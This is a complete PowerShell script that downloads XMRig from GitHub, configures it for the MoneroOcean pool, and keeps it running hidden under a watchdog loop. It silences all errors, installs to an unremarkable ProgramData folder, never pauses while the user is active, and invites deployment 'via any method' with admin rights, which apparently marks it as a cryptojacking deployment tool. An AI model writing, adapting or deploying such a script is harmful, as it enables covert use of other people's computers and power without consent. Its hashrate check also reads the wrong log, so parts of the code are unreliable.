<# 
.SYNOPSIS
    Miner.ps1 - XMRig Downloader + Configurator + Auto-Update
.DESCRIPTION
    Downloads XMRig, configures for MoneroOcean, auto-updates, watches for crashes
.NOTES
    Run as admin for best performance. Can be deployed via any method.
#>

param(
    [string]$Pool = "gulf.moneroocean.stream:10001",
    [string]$Wallet = "YOUR_WALLET",
    [string]$Worker = $env:COMPUTERNAME,
    [string]$Url = "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-gcc-win64.zip",
    [int]$DonateLevel = 1,
    [int]$MaxRetries = 5
)

$ErrorActionPreference = "SilentlyContinue"
$ProgressPreference = "SilentlyContinue"

$base = "C:\ProgramData\MF"
$exePath = "$base\xmrig.exe"
$configPath = "$base\config.json"
$logPath = "$base\miner.log"

New-Item -ItemType Directory -Force -Path $base | Out-Null

function Log { param([string]$msg) $ts = Get-Date -Format "HH:mm:ss"; Add-Content -Path "$base\miner.log" -Value "[$ts] $msg" -Encoding UTF8; Write-Host "[$ts] $msg" }

Log "=== MINER STARTED ==="
Log "Pool: $Pool | Wallet: $Wallet | Worker: $Worker"

# 1. Download XMRig if not exists
if (-not (Test-Path $exePath)) {
    Log "Downloading XMRig..."
    $zipPath = "$env:TEMP\xmrig.zip"
    try {
        Invoke-WebRequest $Url -OutFile $zipPath -UseBasicParsing -TimeoutSec 300
        Expand-Archive $zipPath -DestinationPath "$env:TEMP\xmrig" -Force
        $exe = Get-ChildItem "$env:TEMP\xmrig" -Recurse -Filter "xmrig.exe" | Select-Object -First 1
        if ($exe) { Copy-Item $exe.FullName $exePath -Force; Log "XMRig installed: $exePath" }
    } catch { Log "Download failed: $_"; exit 1 }
} else {
    Log "XMRig already exists: $exePath"
}

# 2. Generate config
$config = @{
    "api" = @{ "id" = $null; "worker-id" = $Worker; "access-token" = $null; "ipv6" = $false; "restricted" = $true }
    "http" = @{ "enabled" = $false; "host" = "127.0.0.1"; "port" = 0; "access-token" = $null; "restricted" = $true }
    "autosave" = $true; "background" = $false; "colors" = $true; "title" = $true; "randomx" = @{ "init" = -1; "mode" = "auto"; "1gb-pages" = $true; "wrmsr" = 6; "numa" = $true; "scratchpad_prefetch_mode" = 1 }
    "cpu" = @{ "enabled" = $true; "huge-pages" = $true; "huge-pages-jit" = $true; "hw-aes" = $null; "priority" = 5; "memory-pool" = $false; "yield" = $true; "max-threads-hint" = 100; "asm" = $true; "argon2-impl" = $null; "cn" = $null; "cn-lite" = $null; "rx" = @{ "init" = -1; "mode" = "auto"; "1gb-pages" = $true; "wrmsr" = 6; "numa" = $true; "scratchpad_prefetch_mode" = 1 } }
    "opencl" = @{ "enabled" = $false }
    "cuda" = @{ "enabled" = $false }
    "donate-level" = $DonateLevel
    "pools" = @(@{ "url" = $Pool; "user" = $Wallet; "pass" = $env:COMPUTERNAME; "keepalive" = $true; "tls" = $false; "nicehash" = $false; "rig-id" = $env:COMPUTERNAME })
    "print-time" = 60; "health-print-time" = 60; "retries" = 5; "retry-pause" = 5; "syslog" = $false; "user-agent" = $null; "watch" = $true; "pause-on-battery" = $false; "pause-on-active" = $false
}
$config | ConvertTo-Json -Depth 10 | Out-File $configPath -Encoding UTF8
Log "Config written: $configPath"

# 3. Watchdog loop
$retries = 0
while ($true) {
    Log "Starting miner (attempt $($retries + 1))..."
    
    $proc = Start-Process -FilePath $exePath -ArgumentList "--config=$configPath" -PassThru -WindowStyle Hidden -ErrorAction SilentlyContinue
    if (-not $proc) { Log "Failed to start miner"; Start-Sleep 30; continue }
    
    Log "Miner started: PID $($proc.Id)"
    $retries = 0
    
    # Monitor process
    while (-not $proc.HasExited) {
        Start-Sleep 30
        
        # Check hashrate from log
        if (Test-Path "$base\miner.log") {
            $lastLine = Get-Content "$base\miner.log" -Tail 1 -ErrorAction SilentlyContinue
            if ($lastLine -match "speed 10s.*?([\d.]+) H/s") {
                $hr = $matches[1]
                if ($hr -lt 100) { Log "Low hashrate: $hr H/s - restarting"; break }
            }
        }
        
        # Check if process is responsive
        if ($proc.Responding -eq $false) { Log "Miner not responding - restarting"; break }
    }
    
    $retries++
    if ($retries -ge $MaxRetries) { Log "Max retries reached. Sleeping 5 min..."; Start-Sleep 300; $retries = 0 }
    
    Log "Miner exited (code: $($proc.ExitCode)). Restarting in 10s..."
    Start-Sleep 10
}